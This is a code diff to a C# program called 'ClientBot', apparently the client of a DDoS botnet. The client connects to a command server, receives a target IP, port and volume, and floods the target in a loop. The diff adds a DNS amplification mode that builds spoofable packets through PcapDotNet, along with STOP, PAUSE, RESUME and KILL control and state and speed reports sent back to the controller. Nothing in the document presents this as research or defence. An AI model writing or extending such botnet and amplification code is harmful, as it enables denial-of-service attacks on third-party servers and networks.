@@ -12,6 +12,7 @@ using Client;
 using System.Net.NetworkInformation;
 using System.Runtime.InteropServices;
 
+
 namespace ClientBot
 {
     class Client
@@ -22,9 +23,6 @@ namespace ClientBot
         static IPAddress client;
         static Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
         static TcpClient hostServer = new TcpClient();
-        static bool stop = false;
-        static bool pause = false;
-        static bool start = false;
         static bool kill = false;
         static string[] a;
         static string[] command;
@@ -44,7 +42,7 @@ namespace ClientBot
                Console.Write(getTime()+"IP " + getIP());
                 client = getIP();
                 Logger.Initialize();
-                ClientBot.SEND.dnsAmplifcation();
+                //ClientBot.SEND.dnsAmplifcation();
                 Connect();
             }
         }
@@ -77,6 +75,7 @@ namespace ClientBot
         {
             try
             {
+                Console.WriteLine(getTime()+"Listen Started");
                 int i = 0;
                 char[] delimiter = { '$',' '};
                 byte[] data = new byte[1024];
@@ -87,23 +86,33 @@ namespace ClientBot
                 IPAddress sentIP = IPAddress.Parse(info[0]);
                 int sentPort = int.Parse(info[1]);
                 int sentData = int.Parse(info[2]);
+                bool dnsAMP = bool.Parse(info[3]);
                 setPreviousCommand(info);
-                Console.WriteLine(StrData);
+                info = null;
+                Console.WriteLine(getTime()+StrData);
                 sendSpeed();
                 clientState = State.CLIENT_SEND;
-                Console.WriteLine("sending now");
-                Send(sentIP, sentPort, sentData);
+                Console.WriteLine(getTime()+"sending now");
+                sendState(clientState);
+                Send(sentIP, sentPort, sentData,dnsAMP);
             }
             catch(Exception e)
             {
                 Console.WriteLine(getTime() + "shit happens " + e);
-                Restart();
+                if (e is System.FormatException)
+                {
+                    Listen();
+                }
+                else
+                { 
+                    Restart();
+                }
                 
             }
         }
         static void task()
         {
-            Console.WriteLine("task called");
+            Console.WriteLine(getTime()+"task called");
             read();
             Task.Run(() =>
             {
@@ -113,7 +122,7 @@ namespace ClientBot
                     
             });
         }
-        static void Send(IPAddress ip,int port, int dataAmount)
+        static void Send(IPAddress ip,int port, int dataAmount,bool dnsAMP)
         {
             Task.Run(() =>
             {
@@ -124,26 +133,56 @@ namespace ClientBot
             });
             try
             {
-                int i = 0;
-                while (ClientBot.SEND.sendData(ip, port, dataAmount, "hello there"))
+                if (!dnsAMP)
                 {
+                    int i = 0;
+                    while (ClientBot.SEND.sendData(ip, port, dataAmount, "hello there"))
+                    {
 
-                    if (clientState == State.CLIENT_SEND)
-                    {
-                        i++;
-                        Console.Write("\r {0} Sending iteration:{1} ", getTime(), i);
-                        Console.Write("\r " + clientState);
+                        if (clientState == State.CLIENT_SEND)
+                        {
+                            i++;
+                            Console.Write("\r{0}"+clientState+" Sending iteration:{1} ", getTime(), i);
+                            ///Console.Write("\r " + clientState);
+                        }
+                        else if (clientState == State.CLIENT_STOP)
+                        {
+                            Console.WriteLine(getTime() + "Breaking Out");
+                            break;
+                        }
+                        else if (clientState == State.CLIENT_PAUSE)
+                        {
+                            Console.WriteLine(getTime() + "Pause Command Received");
+                            break;
+                        }
                     }
-                    else if (clientState == State.CLIENT_STOP)
+                }
+                else if(dnsAMP)
+                {
+                    int i = 0;
+                    PcapDotNet.Packets.Packet packet = ClientBot.SEND.dnsAmplifcation(ip.ToString(), "");
+                    IList<PcapDotNet.Core.LivePacketDevice> packetDevices = PcapDotNet.Core.LivePacketDevice.AllLocalMachine;
+                    PcapDotNet.Core.PacketDevice packetDevice = packetDevices[0];
+                    while (ClientBot.SEND.dns(packet,packetDevice))
                     {
-                        Console.WriteLine(getTime() + "Breaking Out");
-                        break;
+                        if (clientState == State.CLIENT_SEND)
+                        {
+                            i++;
+                            Console.Write("\r {0}"+clientState+"Sending iteration:{1} ", getTime(), i);
+                            //Console.Write("\r " + clientState);
+                        }
+                        else if (clientState == State.CLIENT_STOP)
+                        {
+                            Console.WriteLine(getTime() + "Breaking Out");
+                            break;
+                        }
+                        else if (clientState == State.CLIENT_PAUSE)
+                        {
+                            Console.WriteLine(getTime() + "Pause Command Received");
+                            break;
+                        }
                     }
-                    else if (clientState == State.CLIENT_PAUSE)
-                    {
-                        Console.WriteLine(getTime() + "Pause Command Received");
-                        break;
-                    }
+
                 }
                 //task();
                 
@@ -164,7 +203,11 @@ namespace ClientBot
                 {
                     while (!kill)
                     {
-                        Console.WriteLine("reading startedd");
+                        if(!hostServer.Connected)
+                        {
+                            throw new Exception("Connection lost");
+                        }
+                        Console.WriteLine(getTime()+"reading startedd");
                         string commandStop = Command.STOP.ToString();
                         string commandPause = Command.PAUSE.ToString();
                         string commandStart = Command.START.ToString();
@@ -174,66 +217,109 @@ namespace ClientBot
                         int receivedData = stream.Read(data, 0, data.Length);
                         ret = Encoding.ASCII.GetString(data, 0, receivedData);
 
-                        if (ret.Equals(commandStop))
+                        if (ret.Equals(Command.STOP.ToString()))
                         {
-                            Console.WriteLine(getTime() + "Command received " + ret);
-                            clientState = State.CLIENT_STOP;
-                            Listen();
+                            if (clientState != State.CLIENT_STOP)
+                            {
+                                Console.WriteLine("\n" + getTime() + "Command received " + ret);
+                                clientState = State.CLIENT_STOP;
+                                sendState(clientState);
+                                Console.WriteLine(getTime() + "CALLING LISSTEN FROM read function CommandSTOP");
+                                Listen();
+                            }
                         }
-                        else if (ret.Equals(commandPause))
+                        else if (ret.Equals(Command.PAUSE.ToString()))
                         {
-                            Console.WriteLine(getTime() + "Command received " + ret);
-                            clientState = State.CLIENT_PAUSE;
+                            if (clientState != State.CLIENT_PAUSE)
+                            {
+                                Console.WriteLine(getTime() + "Command received " + ret);
+                                clientState = State.CLIENT_PAUSE;
+                                sendState(clientState);
+                            }
                         }
                         else if (ret.Equals(Command.START.ToString())&&clientState==State.CLIENT_STOP)
                         {
-                            Console.WriteLine(getTime() + "Command received " + ret);
-                            clientState = State.CLIENT_SEND;
-                            Listen();
+                            if (clientState != State.CLIENT_SEND)
+                            {
+                                Console.WriteLine(getTime() + "Command received " + ret);
+                                clientState = State.CLIENT_SEND;
+                                Console.WriteLine(getTime() + "Starting Listen");
+                                sendState(clientState);
+                                Console.WriteLine(getTime() + "CALLING LISSTEN FROM read function CommandStart");
+                                //Listen();
+                            }
                         }
                         else if (ret.Equals(Command.RESUME.ToString()))
                         {
-                            try
+                            if (clientState != State.CLIENT_NULL)
                             {
-                                clientState = State.CLIENT_SEND;
-                                Console.WriteLine(getTime() + "Command received" + ret);
-                                foreach (string a in command)
+                                try
                                 {
-                                    Console.WriteLine(a + " ");
+                                    clientState = State.CLIENT_SEND;
+                                    sendState(clientState);
+                                    Console.WriteLine(getTime() + "Command received" + ret);
+                                    foreach (string a in command)
+                                    {
+                                        Console.WriteLine(a + " ");
+                                    }
+                                    IPAddress sentIP = IPAddress.Parse(command[0]);
+                                    int sentPort = int.Parse(command[1]);
+                                    int sentData = int.Parse(command[2]);
+                                    bool sentDNS = bool.Parse(command[3]);
+                                    Console.WriteLine(getTime() + " sending " + command[0].ToString() + " " + command[1].ToString() + " " + command[2].ToString() + " " + command[3].ToString());
+                                    Send(sentIP, sentPort, sentData, sentDNS);
                                 }
-                                IPAddress sentIP = IPAddress.Parse(command[0]);
-                                int sentPort = int.Parse(command[1]);
-                                int sentData = int.Parse(command[2]);
-                                Console.WriteLine(getTime() + " sending " + command[0].ToString() + " " + command[1].ToString() + " " + command[2].ToString());
-                                Send(sentIP, sentPort, sentData);
-                            }
-                            catch (Exception e)
-                            {
-                                Console.WriteLine("Resume error" + e);
-                                Restart();
+                                catch (Exception e)
+                                {
+                                    Console.WriteLine(getTime() + "Resume error" + e);
+                                    Restart();
+                                }
                             }
                         }
                         else if (ret.Equals(Command.KILL.ToString()))
                         {
-                            Console.WriteLine("Exiting");
+                            Console.WriteLine(getTime()+"Exiting");
                             Thread.Sleep(10000);
                             KillApp();
                         }
                         else
                         {
-                            Console.WriteLine("IDK WHAT TO DO");
-                            Thread.Sleep(10000);
-                            read();
+                            Console.WriteLine(getTime()+"IDK WHAT TO DO"+ret);
+                            if (ret.Contains("$"))
+                            {
+                                string[] info = ret.Split('$');
+                                IPAddress sentIP = IPAddress.Parse(info[0]);
+                                int sentPort = int.Parse(info[1]);
+                                int sentData = int.Parse(info[2]);
+                                bool dnsAMP = bool.Parse(info[3]);
+                                setPreviousCommand(info);
+                                sendSpeed();
+                                clientState = State.CLIENT_SEND;
+                                Console.WriteLine(getTime() + "sending now");
+                                Send(sentIP, sentPort, sentData, dnsAMP);
+                            }
+                            else
+                            {
+                                Thread.Sleep(1000);
+                                read();
+                            }
                         }
                     }
                 });
             }
             catch(Exception e)
             {
-                Console.WriteLine("error " + e);
+                Console.WriteLine(getTime()+"error " + e);
                 Restart();
             }
             //    return ret;
+        }
+        static async Task sendState(State state)
+        {
+            State currentState = state;
+            NetworkStream stream = hostServer.GetStream();
+            string statement = MessageType.STATE.ToString()+"$"+ getIP() + "$" + currentState.ToString();
+            stream.Write(Encoding.ASCII.GetBytes(statement), 0, Encoding.ASCII.GetBytes(statement).Length);
         }
         static void setPreviousCommand(string[] a)
         {
@@ -242,7 +328,7 @@ namespace ClientBot
         }
         static string[] getPreviousCommand()
         {
-            
+
             return command;
         }
         static void write(string text)
@@ -294,7 +380,11 @@ namespace ClientBot
               {
 
               }*/
-            speed++;
+            IPGlobalProperties properties = IPGlobalProperties.GetIPGlobalProperties();
+            IPGlobalStatistics stats = null;
+            stats = properties.GetIPv4GlobalStatistics();
+            long sp = stats.ReceivedPacketsDelivered;
+            speed = sp;
             return speed;
         }
 
@@ -308,7 +398,7 @@ namespace ClientBot
             NetworkStream stream = hostServer.GetStream();
             string ip = getIP().ToString();
             double speed = getSpeed();
-            string toSend = ip +"$"+ speed;
+            string toSend = MessageType.SPEED.ToString()+"$"+ ip +"$"+ speed;
             stream.Write(Encoding.ASCII.GetBytes(toSend), 0, Encoding.ASCII.GetBytes(toSend).Length);
         }
         static void KillApp()
@@ -337,7 +427,13 @@ namespace ClientBot
         CLIENT_DISCONNECT,
         CLIENT_SEND,
         CLIENT_PAUSE,
-        CLIENT_STOP
+        CLIENT_STOP,
+        CLIENT_NULL
+    }
+    public enum MessageType
+    {
+        STATE,
+        SPEED
     }
 }
 
